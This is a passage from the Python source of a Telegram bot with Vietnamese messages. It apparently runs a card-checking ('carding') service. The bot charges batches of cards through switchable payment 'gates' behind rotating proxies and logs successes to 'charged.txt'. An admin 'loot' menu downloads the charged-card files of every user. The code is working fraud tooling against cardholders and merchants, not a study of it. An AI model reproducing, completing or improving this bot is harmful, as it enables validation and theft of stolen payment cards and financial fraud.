        keyboard.append([InlineKeyboardButton(f"?? {proxy}", callback_data=f"testprx_{i}")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(f"Ch?n proxy ð? ki?m tra (k?t n?i t?i google.com):\nTr?ng thái s? d?ng proxy: **{status}**", reply_markup=reply_markup)

async def button_handler(update, context):
    query = update.callback_query
    user_from_callback = query.from_user
    data = query.data.split('_')
    command = data[0]
    if command == "setlang":
        await query.answer()
        lang_code = data[1]
        set_user_lang(user_from_callback.id, lang_code)
        help_text = await get_help_text(user_from_callback, lang_code)
        await query.edit_message_text(help_text, disable_web_page_preview=True)
        return
    if command == "setgate8mode":
        if user_from_callback.id != ADMIN_ID:
            await query.answer("B?n không có quy?n.", show_alert=True)
            return
        mode = data[1]
        set_gate8_mode(mode)
        set_active_gate('8')
        new_gate_name = get_formatted_gate_name('8')
        await query.answer(f"Ð? ð?i sang {new_gate_name}")
        await query.edit_message_text(f"? Ð? chuy?n c?ng thanh toán sang: **{new_gate_name}**")
        return
    if command == "setgate9mode":
        if user_from_callback.id != ADMIN_ID:
            await query.answer("B?n không có quy?n.", show_alert=True)
            return
        mode = data[1]
        set_gate9_mode(mode)
        set_active_gate('9')
        new_gate_name = get_formatted_gate_name('9')
        await query.answer(f"Ð? ð?i sang {new_gate_name}")
        await query.edit_message_text(f"? Ð? chuy?n c?ng thanh toán sang: **{new_gate_name}**")
        return
    if command == "stop":
        await query.answer()
        action = data[1]
        target_user_id = int(data[2])
        if action == "task" and user_from_callback.id == ADMIN_ID:
            if target_user_id in CANCELLATION_EVENTS:
                CANCELLATION_EVENTS[target_user_id].set()
                await query.edit_message_text(f"? Ð? g?i yêu c?u d?ng tác v? cho ngý?i dùng `{target_user_id}`.")
            else:
                await query.edit_message_text(f"?? Tác v? c?a ngý?i dùng `{target_user_id}` ð? k?t thúc ho?c không t?n t?i.", reply_markup=None)
        elif action == "mytask" and user_from_callback.id == target_user_id:
            if target_user_id in CANCELLATION_EVENTS:
                CANCELLATION_EVENTS[target_user_id].set()
                await query.edit_message_text("? Ð? g?i yêu c?u d?ng. Tác v? s? s?m d?ng l?i...", reply_markup=None)
            else:
                await query.edit_message_text("?? Tác v? c?a b?n ð? k?t thúc ho?c không t?n t?i.", reply_markup=None)
        else:
                await query.answer("B?n không có quy?n th?c hi?n hành ð?ng này.", show_alert=True)
        return
    if command == "delprx":
        if user_from_callback.id != ADMIN_ID:
            await query.answer("B?n không có quy?n.", show_alert=True); return
        try:
            proxy_index = int(data[1])
            proxies_data = load_proxies()
            if 0 <= proxy_index < len(proxies_data['proxies']):
                deleted_proxy = proxies_data['proxies'].pop(proxy_index)
                save_proxies(proxies_data)
                await query.answer(f"Ð? xóa proxy: {deleted_proxy}")
                new_keyboard = []
                if proxies_data['proxies']:
                    for i, proxy in enumerate(proxies_data['proxies']):
                        new_keyboard.append([InlineKeyboardButton(f"??? {proxy}", callback_data=f"delprx_{i}")])
                    reply_markup = InlineKeyboardMarkup(new_keyboard)
                    await query.edit_message_text("Ð? xóa. Ch?n proxy khác ð? xóa:", reply_markup=reply_markup)
                else:
                    await query.edit_message_text("Ð? xóa proxy cu?i cùng. Danh sách hi?n tr?ng.")
            else:
                await query.answer("L?i: Proxy không c?n t?n t?i.", show_alert=True)
        except (ValueError, IndexError) as e:
            logger.error(f"L?i khi xóa proxy: {e}")
            await query.answer("L?i khi x? l? yêu c?u.", show_alert=True)
        return
    if command == "testprx":
        if user_from_callback.id != ADMIN_ID:
            await query.answer("B?n không có quy?n.", show_alert=True); return
        try:
            proxy_index = int(data[1])
            proxies_data = load_proxies()
            proxy_to_test = proxies_data['proxies'][proxy_index]
            await query.answer(f"Ðang ki?m tra {proxy_to_test}...")
            is_working, reason = await asyncio.to_thread(_test_proxy, proxy_to_test)
            result_icon = "?" if is_working else "?"
            await query.message.reply_text(f"**K?t qu? ki?m tra Proxy:**\n{result_icon} `{proxy_to_test}`\n**L? do:** `{reason}`")
        except (ValueError, IndexError) as e:
            logger.error(f"L?i khi test proxy: {e}")
            await query.answer("L?i: Không t?m th?y proxy ð? test.", show_alert=True)
        return
    await query.answer()
    if user_from_callback.id != ADMIN_ID:
        await query.answer("B?n không có quy?n th?c hi?n hành ð?ng này.", show_alert=True); return
    action = data[1]
    target_user_id = data[2] if len(data) > 2 else None
    if command == "loot":
        if action == "mainmenu":
            keyboard = [
                [InlineKeyboardButton("1. L?y File Charge G?n Nh?t", callback_data=f"loot_latestcharge_{target_user_id}")],
                [InlineKeyboardButton("2. L?y T?t C? File Charge", callback_data=f"loot_allcharge_{target_user_id}")],
                [InlineKeyboardButton("3. Ch?n T? L?ch S?", callback_data=f"loot_history_{target_user_id}")],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"Ch?n tùy ch?n ð? l?y file c?a user `{target_user_id}`:", reply_markup=reply_markup)
        elif action == "latestcharge":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
                await query.edit_message_text(f"Không có l?ch s? check cho user `{target_user_id}`."); return
            latest_session = sorted(os.listdir(user_log_dir), reverse=True)[0]
            file_path = os.path.join(user_log_dir, latest_session, "charged.txt")
            if os.path.exists(file_path):
                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=query.from_user.id, document=doc)
                await query.edit_message_text(f"? Ð? g?i file charge g?n nh?t t? session `{latest_session}`.")
            else:
                await query.edit_message_text(f"?? L?n check g?n nh?t (`{latest_session}`) không có th? charge nào.")
        elif action == "allcharge":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            all_charged_content = []
            if os.path.exists(user_log_dir):
                sessions = sorted(os.listdir(user_log_dir))
                for session_ts in sessions:
                    file_path = os.path.join(user_log_dir, session_ts, "charged.txt")
                    if os.path.exists(file_path):
                        with open(file_path, 'r', encoding='utf-8') as f: all_charged_content.append(f.read())
            if all_charged_content:
                combined_content = "\n".join(all_charged_content)
                with io.BytesIO(combined_content.encode('utf-8')) as file_to_send:
                    filename = f"all_charged_{target_user_id}.txt"
                    await context.bot.send_document(chat_id=query.from_user.id, document=file_to_send, filename=filename)
                await query.edit_message_text(f"? Ð? g?i file t?ng h?p t?t c? th? charge c?a user `{target_user_id}`.")
            else:
                await query.edit_message_text(f"?? User `{target_user_id}` không có th? charge nào trong l?ch s?.")
        elif action == "history":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            sessions = sorted(os.listdir(user_log_dir), reverse=True)[:25]
            keyboard = []
            for session_ts in sessions:
                summary_path = os.path.join(user_log_dir, session_ts, "summary.json")
                if os.path.exists(summary_path):
                    summary = load_json_file(summary_path)
                    counts = summary.get('counts', {})
                    try: dt_obj = datetime.strptime(session_ts, "%Y%m%d-%H%M%S"); readable_ts = dt_obj.strftime("%d/%m/%Y %H:%M")
                    except ValueError: readable_ts = session_ts
                    button_text = f"?? {readable_ts} - ?{counts.get('success',0)} ?{counts.get('decline',0)}"
                    keyboard.append([InlineKeyboardButton(button_text, callback_data=f"loot_session_{target_user_id}_{session_ts}")])
            keyboard.append([InlineKeyboardButton("« Quay l?i Menu Chính", callback_data=f"loot_mainmenu_{target_user_id}")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"?? **L?ch s? check c?a user `{target_user_id}`:**", reply_markup=reply_markup)
        elif action == "session":
            _, _, target_user_id, session_ts = data
            session_dir = os.path.join(LOG_DIR, target_user_id, session_ts)
            files = [f for f in os.listdir(session_dir) if f.endswith('.txt')] if os.path.exists(session_dir) else []
            if not files:
                await query.edit_message_text("Session này không có file k?t qu? nào."); return
            keyboard = []
            for filename in files:
                keyboard.append([InlineKeyboardButton(f"T?i {filename}", callback_data=f"loot_getfile_{target_user_id}_{session_ts}_{filename}")])
            keyboard.append([InlineKeyboardButton("« Quay l?i L?ch S?", callback_data=f"loot_history_{target_user_id}")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"Ch?n file ð? t?i t? session `{session_ts}`:", reply_markup=reply_markup)
        elif action == "getfile":
            _, _, target_user_id, session_ts, filename = data
            file_path = os.path.join(LOG_DIR, target_user_id, session_ts, filename)
            if os.path.exists(file_path):
                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=query.from_user.id, document=doc)
                await query.answer(f"Ð? g?i file {filename}")
            else:
                await query.answer("? L?i: Không t?m th?y file.", show_alert=True)

def main():
    defaults = Defaults(parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
    application = Application.builder().token(BOT_TOKEN).defaults(defaults).build()

    # L?nh chung
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stop", stop_command))
    
    # L?nh Admin
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("show", show_users))
    application.add_handler(CommandHandler("addlimit", add_limit_command))
    application.add_handler(CommandHandler("addlimitmulti", add_multi_limit_command))
    application.add_handler(CommandHandler("showcheck", show_check_command))
    application.add_handler(CommandHandler("lootfile", loot_file_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("gate", gate_command))
    application.add_handler(CommandHandler("setgate", set_gate_range_command))
    application.add_handler(CommandHandler("on", turn_bot_on))
    application.add_handler(CommandHandler("off", turn_bot_off))
    application.add_handler(CommandHandler("send", send_message_command))
    application.add_handler(CommandHandler("sendall", send_all_command))
    application.add_handler(CommandHandler("active", active_checks_command)) 

    # L?NH PROXY
    application.add_handler(CommandHandler("onprx", on_proxy_command))
    application.add_handler(CommandHandler("offprx", off_proxy_command))
    application.add_handler(CommandHandler("addprx", add_proxy_command))
    application.add_handler(CommandHandler("deleteprx", delete_proxy_command))
    application.add_handler(CommandHandler("testprx", test_proxy_command))
    
    # L?nh Check
    application.add_handler(MessageHandler(filters.Regex(r'^/cs(\d+)'), cs_custom_amount_command))
    application.add_handler(CommandHandler("cs", cs_command))
    application.add_handler(CommandHandler("bin", bin_command))
    application.add_handler(CommandHandler("multi", multi_check_command))
    application.add_handler(MessageHandler(filters.Document.TEXT & filters.CaptionRegex(r'^/mass(\d*)'), mass_check_handler))
    
    # L?nh Site Checker
    application.add_handler(CommandHandler("site", site_command))
    application.add_handler(CommandHandler("sitem", sitem_command))

    # X? l? nút b?m
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # <<<--- KH?I CH?Y TI?N TR?NH SITE CHECKER ---<<<
    site_checker_process = None
    try:
        # S? d?ng sys.executable ð? ð?m b?o dùng ðúng tr?nh thông d?ch Python ðang ch?y bot
        # Ði?u này giúp týõng thích v?i các môi trý?ng ?o (virtual environments)
        site_checker_file = "site_checker.py"
        if not os.path.exists(site_checker_file):
             logger.error(f"FATAL: Không t?m th?y file '{site_checker_file}'. Ch?c nãng /site và /sitem s? không ho?t ð?ng.")
        else:
            logger.info(f"Starting '{site_checker_file}' subprocess...")
            site_checker_process = subprocess.Popen([sys.executable, site_checker_file])
            logger.info(f"Site Checker process started with PID: {site_checker_process.pid}")

        logger.info(f"Bot is running with Admin ID: {ADMIN_ID}")
        application.run_polling()

    finally:
        # Ð?m b?o ti?n tr?nh con ðý?c t?t khi bot chính d?ng
        if site_checker_process:
            logger.info("Shutting down Site Checker process...")
            site_checker_process.terminate()
            site_checker_process.wait() # Ch? ti?n tr?nh con k?t thúc h?n
            logger.info("Site Checker process terminated.")


if __name__ == '__main__':
    main()
